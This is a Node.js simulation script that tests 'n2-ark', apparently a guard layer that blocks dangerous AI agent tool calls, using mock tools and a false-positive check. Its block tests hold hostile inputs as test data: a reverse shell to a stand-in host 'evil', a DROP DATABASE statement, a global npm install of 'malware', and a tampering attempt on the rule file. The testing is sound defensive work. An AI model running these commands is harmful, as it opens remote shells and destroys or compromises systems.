// n2-ark + n2-soul integration simulation — results written via Node fs
const path = require('path');
const fs = require('fs');
const { createArk } = require('./index');
const ark = createArk({ rulesDir: path.join(__dirname, 'rules') });

const lines = [];
const log = (msg) => lines.push(msg);

log('═══════════════════════════════════════');
log('🛡️ n2-ark + n2-soul Integration Simulation');
log('═══════════════════════════════════════\n');

// Mock server.registerTool
const registeredTools = {};
const mockServer = {
    registerTool: function(name, schema, handler) {
        registeredTools[name] = { schema, handler };
    }
};

// Wrapper
function wrapWithArk(server, ark) {
    const origRegister = server.registerTool.bind(server);
    server.registerTool = (name, schema, handler) => {
        origRegister(name, schema, async (args) => {
            const content = JSON.stringify(args);
            const check = ark.check(name, content, 'tool_call');
            if (!check.allowed) {
                return { content: [{ type: 'text', text: `🛡️ BLOCKED: ${check.reason}` }] };
            }
            return handler(args);
        });
    };
}

wrapWithArk(mockServer, ark);

// Register mock tools
mockServer.registerTool('n2_boot', {}, async (a) => ({ content: [{ type: 'text', text: `Booted: ${a.agent}` }] }));
mockServer.registerTool('n2_work_start', {}, async (a) => ({ content: [{ type: 'text', text: `Started: ${a.task}` }] }));
mockServer.registerTool('n2_work_claim', {}, async (a) => ({ content: [{ type: 'text', text: `Claimed: ${a.filePath}` }] }));
mockServer.registerTool('n2_brain_write', {}, async (a) => ({ content: [{ type: 'text', text: `Written: ${a.filename}` }] }));
mockServer.registerTool('n2_work_end', {}, async (a) => ({ content: [{ type: 'text', text: `Ended: ${a.summary}` }] }));

async function runTests() {
    let passed = 0, failed = 0;

    async function test(desc, toolName, args, expectAllowed) {
        const tool = registeredTools[toolName];
        const result = await tool.handler(args);
        const text = result.content[0].text;
        const wasBlocked = text.includes('BLOCKED');
        const ok = wasBlocked !== expectAllowed;
        if (ok) { log(`  ✅ ${desc}`); passed++; }
        else { log(`  ❌ ${desc} → expected ${expectAllowed ? 'PASS' : 'BLOCK'}, got ${wasBlocked ? 'BLOCK' : 'PASS'}: ${text.slice(0,80)}`); failed++; }
    }

    log('📦 TEST 1: Normal tool calls (should PASS)');
    await test('boot normal', 'n2_boot', { agent: 'rose', project: 'test' }, true);
    await test('work_start normal', 'n2_work_start', { agent: 'rose', project: 'test', task: 'Build login page' }, true);
    await test('work_claim normal file', 'n2_work_claim', { project: 'test', agent: 'rose', filePath: 'src/index.js', intent: 'Add feature' }, true);
    await test('brain_write normal', 'n2_brain_write', { filename: 'notes.md', content: 'Todo for next session' }, true);
    await test('work_end normal', 'n2_work_end', { agent: 'rose', project: 'test', title: 'Done', summary: 'Added login' }, true);

    log('\n🔴 TEST 2: Dangerous content (should BLOCK)');
    await test('brain write DROP DATABASE', 'n2_brain_write', { filename: 'x.sql', content: 'DROP DATABASE users;' }, false);
    await test('brain write reverse shell', 'n2_brain_write', { filename: 'x.sh', content: 'bash -i > /dev/tcp/evil/4444' }, false);
    await test('claim .n2 rule file', 'n2_work_claim', { project: 'test', agent: 'evil', filePath: 'rules/default.n2', intent: 'modify' }, false);
    await test('brain write npm install -g', 'n2_brain_write', { filename: 'x', content: 'npm install -g malware' }, false);

    log('\n⚠️ TEST 3: False positive check (might BLOCK legit content)');
    await test('mention payment in notes', 'n2_brain_write', { filename: 'plan.md', content: 'We need to implement payment feature' }, true);
    await test('mention git push in summary', 'n2_work_end', { agent: 'rose', project: 'test', title: 'Deploy', summary: 'Did git push to staging' }, true);
    await test('work_start with rm mention', 'n2_work_start', { agent: 'rose', project: 'test', task: 'Remove unused components' }, true);

    log('\n═══════════════════════════════════════');
    log(`📊 RESULTS: ${passed} passed, ${failed} failed (total ${passed + failed})`);
    log('═══════════════════════════════════════');

    fs.writeFileSync(path.join(__dirname, 'sim-result.txt'), lines.join('\n'), 'utf8');
    console.log('Results written to sim-result.txt');
}

runTests().catch(console.error);
